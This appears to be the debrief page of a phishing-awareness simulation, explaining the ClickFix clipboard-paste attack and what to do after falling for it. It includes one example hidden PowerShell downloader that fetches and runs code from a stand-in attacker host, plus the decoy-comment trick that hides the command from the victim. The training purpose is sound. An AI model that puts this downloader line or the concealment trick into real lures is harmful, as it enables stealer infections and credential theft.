Debrief

How ClickFix works

The attack that needs no download, no attachment and no exploit — just you.

What just happened

  1. A page told you a routine check had failed — a CAPTCHA, a document, a driver, an update.
  2. The moment you clicked, the page wrote a command into your clipboard. Nothing warned you.
  3. It then asked you to open a system run box and paste. That is the whole attack: the page cannot run code on your machine, so it asks you to do it for it.
  4. Pressing Enter executes it with your account's privileges. No download prompt, no "unknown publisher" warning, no SmartScreen — because you typed it.

The command you were given

{{ payload_head }}
{{ decoy_tail }}

■ The real instruction. In this simulation it prints a banner. In a live campaign this is where a one-line downloader sits — something like powershell -w hidden -c "iwr hxxps://attacker[.]example/a | iex" — which pulls a stealer straight into memory.

■ The decoy tail, and the cleverest part of the trick. When you paste into the Run dialog, the field scrolls to the end of the text. So the last thing you see before pressing Enter is a reassuring "I am not a robot — verification ID". The command is scrolled off to the left, out of sight.

Why it beats your other defences

  • Nothing is downloaded, so the browser never warns you and there is no file for the mail gateway to scan.
  • The tools are legitimate. PowerShell and the Run dialog ship with Windows; endpoint tools have to be careful about blocking them outright.
  • You consented. Every control that exists to stop software running without permission is satisfied, because you gave permission.
  • It is cheap and fast to change. The lure is a web page; attackers rotate the wording, the styling and the domain daily.

The one rule that stops all of it

Never paste a command into Run, PowerShell or Terminal because a web page, a document or a stranger told you to.

There is no legitimate version of this request. Not from a CAPTCHA, not from a document viewer, not from a meeting app, not from a browser update, not from IT. If {{ cfg.operator }} genuinely needs something run on your machine, it arrives through device management, not through a copy button on a website.

If this had been real

Assume everything the account could reach is compromised: saved browser passwords, session cookies (which bypass MFA), crypto wallets, VPN and SSH keys, and anything reachable from the machine afterwards. Speed matters far more than embarrassment.

  1. Disconnect the device from the network. Do not shut it down.
  2. Contact {{ cfg.operator }} immediately at {{ cfg.security_contact }}.
  3. From a different device, change your passwords and revoke active sessions.
  4. Say exactly what you pasted and when. Nobody will be annoyed with you — they will be glad you called.

Two minutes to make it stick

A CAPTCHA asks you to press Win+R and paste a code. What is it?

No verification system on earth needs your Run dialog. HTTPS only means the connection is encrypted — it says nothing about who is on the other end.

Why does the pasted command end with "I am not a robot — verification ID"?

It is a comment. Its only job is to be the reassuring thing you see in the box just before you press Enter.

You already pressed Enter on one of these. What do you do first?

Stealers finish in seconds and often leave no visible window; a clean scan proves nothing. Minutes matter for revoking sessions before they are used.
